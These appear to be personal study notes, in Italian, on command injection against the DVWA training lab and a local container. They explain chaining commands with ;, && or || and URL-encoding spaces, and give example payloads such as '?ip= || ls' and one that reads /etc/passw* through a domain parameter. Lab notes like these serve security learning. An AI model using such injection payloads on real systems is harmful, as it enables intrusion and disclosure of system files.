#Supponiamo che un sito web abbia un campo di input che permette di eseguire comandi.
Ad un certo punto il nostro input viene eseguito
Possiamo provare ad inserire nell'input il nome di un comando come ad esempio ls

#Proviamo ad inserire il comando ls
#ES : http://dvwa/vulnerabilities/exec/?ip=ls

#Se l'input viene valutato per essere eseguito direttamente da shell 
possiamo inseire un input del tipo QUALCOSA;ls
#; è un carattere di escape che permette di eseguire un comando successivo
#In caso possiamo sostituirlo con && oppure ||


#In caso si debba inserire un comando nell'url occorre considerare che uno spazio viene codificato come %20
#Quindi possiamo sostituire lo spazio con %20
#ES : http://dvwa/vulnerabilities/exec/?ip=ls%20-la

http://dvwa/vulnerabilities/exec/?ip= || ls




http://172.17.0.2:8081/?domain=%20||%20tail%20/etc/passw*